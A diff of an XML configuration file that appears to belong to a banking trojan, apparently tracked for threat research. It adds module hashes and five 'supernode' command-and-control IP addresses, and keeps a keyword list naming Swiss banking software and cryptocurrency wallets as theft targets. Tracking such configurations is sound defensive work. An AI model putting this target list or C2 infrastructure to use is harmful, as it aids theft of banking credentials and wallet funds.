@@ -23,6 +23,15 @@
 <settings>
   <modules>
     <module>
+      <sha256>b9492add6b867bd9df4474e43648af0aa46cbf0c5bf2d7b27b91f5a3f9313351</sha256>
+      <sha1>ddf1695ada70cf2e37eb38e52060756fa3dca166</sha1>
+      <md5>c39d8295ce6d81c57e7f3044b5feeaae</md5>
+      <timestamp>2017-12-30T23:01:28+00:00</timestamp>
+      <architecture>32</architecture>
+      <name>n/a</name>
+      <crc>0x1d1df6f5</crc>
+    </module>
+    <module>
       <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
       <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
       <md5>2680cd66b98910d26bfd815d83ca330f</md5>
@@ -33,10 +42,13 @@
     </module>
   </modules>
   <commands>
-    <cmd id="989550" type="15">
+    <cmd id="583181" type="15">
       <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
     </cmd>
-    <cmd id="989551" type="22">
+    <cmd id="583183" type="22">
+      <fs/>
+    </cmd>
+    <cmd id="990981" type="19">
       <fs/>
     </cmd>
   </commands>
@@ -507,4 +519,26 @@ qweqweqwe.send();
       <ip>104.131.187.88</ip>
     </host>
   </c2>
+  <supernodes>
+    <node>
+      <ip>212.237.42.204</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>193.251.189.134</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>81.254.168.177</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>50.251.187.217</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>109.21.222.28</ip>
+      <port>443</port>
+    </node>
+  </supernodes>
 </settings>
